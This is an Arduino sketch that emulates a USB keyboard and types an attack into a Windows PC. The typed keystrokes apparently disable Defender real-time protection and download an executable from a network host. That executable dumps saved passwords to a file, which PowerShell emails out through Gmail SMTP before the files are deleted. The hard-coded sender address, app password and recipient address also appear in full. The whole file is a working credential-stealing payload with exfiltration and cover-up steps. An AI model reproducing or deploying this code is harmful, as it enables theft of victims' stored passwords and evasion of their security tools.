#include "keys.h"

uint8_t buf[8] = { 
  0 };   /* Keyboard report buffer */

void setup() 
{
  Serial.begin(9600);
  randomSeed(analogRead(0));
  delay(200);

  typeSpecialKey("windows");
  delay(500);
  typeLine("virus & threat");
  typeSpecialKey("enter");
  delay(500);
  for(int i = 0; i < 4; i++) {
    typeSpecialKey("tab");
    delay(200);
  }
  typeSpecialKey("enter");
  delay(500);
  typeSpecialKey(' ');
  delay(1000);
  typeSpecialKey("grantPermission");
  delay(500);
  typeSpecialKey("closeWindow");
  delay(500);
  typeSpecialKey("OpenRun");
  delay(500);
  typeLine("cmd");
  typeSpecialKey("enter");
  delay(500);
  typeLine("cd %temp% && powershell Invoke-WebRequest -Uri http://192.168.0.125:8000/a.exe -OutFile a.exe && a /stext pass.txt");
  typeSpecialKey("enter");
  delay(3000);
  typeLine("powershell");
  typeSpecialKey("enter");
  delay(700);

  typeLine("$SMTPServer = 'smtp.gmail.com'");
  typeSpecialKey("enter");

  typeLine("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
  typeSpecialKey("enter");

  typeLine("$SMTPInfo.EnableSSL = $true");
  typeSpecialKey("enter");

  typeLine("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('harleyquinn1165@gmail.com', 'bvzs ndoz imsl mmpu')");
  typeSpecialKey("enter");

  typeLine("$ReportEmail = New-Object System.Net.Mail.MailMessage");
  typeSpecialKey("enter");

  typeLine("$ReportEmail.From = 'harleyquinn1165@gmail.com'");
  typeSpecialKey("enter");

  typeLine("$ReportEmail.To.Add('cavinkumaran1257@gmail.com')");
  typeSpecialKey("enter");

  typeLine("$ReportEmail.Subject = 'Passwords from Arduino Duck ; )'");
  typeSpecialKey("enter");

  typeLine("$ReportEmail.Body = (Get-Content pass.txt | out-string)");
  typeSpecialKey("enter");

  typeLine("$SMTPInfo.Send($ReportEmail)");
  typeSpecialKey("enter");

  delay(5000);

  typeLine("del a.exe");
  typeSpecialKey("enter");
  delay(500);
  typeLine("del pass.txt");
  typeSpecialKey("enter");

  delay(500);
  typeLine("exit");
  typeSpecialKey("enter");
  delay(500);
  typeLine("exit");
  typeSpecialKey("enter");

}

void loop() 
{ 
  // delay(3000);
  // typeSpecialKey("windows");

}

void typeLine(char* line) {
  for(int i = 0; i < strlen(line); i++) {
    // Serial.print(" ");
    if(line[i] >= 'a' && line[i] <= 'z') {
      typeKey(line[i]);
    }
    else if(line[i] >= 'A' && line[i] <= 'Z') {
      typeCapsKey(line[i]);
    }
    else if(line[i] >= '0' && line[i] <= '9') {
      typeNum(line[i]);
    }
    else {
      typeSpecialKey(line[i]);
    }
  }
}

void typeSpecialKey(char* key) {
  getMiscHex(key, &buf[0], &buf[2]);
  Serial.write(buf, 8);
  releaseKey(); 
}

void typeCapsKey(char* key) {
  getCapsHex(key, &buf[0], &buf[2]);
  Serial.write(buf, 8);
  releaseKey(); 
}

void typeKey(char* key) {
  buf[2] = getHex(key);
  Serial.write(buf, 8);
  releaseKey(); 
}

void typeNum(char* key) {
  buf[2] = getNumHex(key);
  Serial.write(buf, 8);
  releaseKey(); 
}

void releaseKey() 
{
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8); // Release key  
}
